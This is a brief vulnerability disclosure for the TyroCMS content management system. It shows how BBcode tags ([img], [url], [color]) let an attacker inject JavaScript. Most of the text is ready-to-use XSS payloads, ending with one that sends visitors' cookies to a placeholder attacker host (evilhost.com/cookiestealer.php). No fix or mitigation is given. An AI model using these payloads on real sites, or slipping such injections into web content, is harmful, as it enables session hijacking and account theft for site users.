impact:moderate (privilege escalation,possible defacement)

TyroCMS is a PHP & MySql powered content management system(cms).
Inludes built-in forums, powerful admin control panel, secure user system, and much more.
Easily manage the site throuh the admin panel even if you do not have great webmastering skills! 

Due to the way BBcode is interprented by TyroCms it is possible to inject javascript in several statements like:
In images:

[img]javascript:alert('xss')[/img]

or in urls:

[url=x" onmouseover="alert('xss')]Site Name[/url]

or in colors:

[color=red" onmouseover="alert('xss')]lol[/color]

See? We could inject javascript like this:

javascript:window.navigate('http://www.evilhost.com/cookiestealer.php?c='+document.cookie)

to steal cookies.
